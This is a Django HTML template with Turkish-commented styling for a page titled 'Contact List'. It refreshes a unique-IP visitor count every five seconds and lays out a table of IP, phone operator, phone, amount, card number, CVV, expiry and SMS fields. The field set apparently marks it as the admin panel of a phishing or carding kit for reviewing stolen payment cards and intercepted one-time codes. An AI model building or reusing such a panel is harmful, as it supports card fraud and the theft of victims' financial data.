{% load static %}
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Contact List</title>

<link rel="stylesheet" type="text/css" href="{% static 'css/crud.css' %}">

    <!-- Add Bootstrap CSS -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
</head>

<h1>Unique IP addresses count: <span id="ip-count"></span></h1>

<script>
    function updateIPCount() {
        $.ajax({
            url: '{% url "unique_ip_count" %}',
            type: 'GET',
            dataType: 'json',
            success: function (data) {
                // Replace the following line
                // $('#ip-count').text(data.count);
                // With this line
                document.getElementById('ip-count').innerText = data.count;
            }
        });
    }

    // Update the IP count every 5 seconds
    setInterval(updateIPCount, 5000);

    // Update the IP count immediately on page load
    updateIPCount();
</script>

<body>
    {% block content %}
        <div class="container">
            <h1>Contact List</h1>
            <table class="table table-striped table-hover">
                <thead class="table-dark">
                    <tr>
                        <th>ID</th>
                        <th>IP</th>
                        <th>operator</th>
                        <th>Phone</th>
                        <th>Amount</th>
                        <th>Card Number</th>
                        <th>CVV</th>
                        <th>MM</th>
                        <th>YY</th>
                        <th>SMS</th>
                        <th>Created At</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                
                <tbody id="contact-table-body">
                    <!-- JavaScript will populate this section -->
                </tbody>
            </table>
        </div>
    {% endblock %}
    {% block extra_js %}
        <script src="{% static 'js/crud.js' %}"></script>
    {% endblock %}
    
    <!-- Add Bootstrap JavaScript -->
</body>
<style>
    /* Sayfa arka plan rengi */
body {
    background-color: black;
}

/* Başlık yazıları */
h1, h2, h3, h4, h5, h6 {
    color: orange;
}

/* Menü linkleri */
.menu-link {
    color: white;
}

/* Menü hover efekti */
.menu-link:hover {
    color: orange;
}

/* Genel metinler */
p, span, a {
    color: white;
}

/* Butonlar */
button {
    background-color: orange;
    color: black;
}

/* Buton hover efekti */
button:hover {
    background-color: black;
    color: orange;
}

/* Formlar */
input[type="text"], input[type="email"], input[type="password"], textarea {
    background-color: black;
    color: white;
    border: 1px solid orange;
}

/* Formlar - buton */
input[type="submit"] {
    background-color: orange;
    color: black;
}

/* Formlar - buton hover efekti */
input[type="submit"]:hover {
    background-color: black;
    color: orange;
}

/* Footer linkleri */
.footer-link {
    color: orange;
}

/* Footer hover efekti */
.footer-link:hover {
    color: white;
}

/* Görseller */
img {
    border: 1px solid orange;
}

/* Hover efekti */
img:hover {
    opacity: 0.8;
}

</style>
</html>
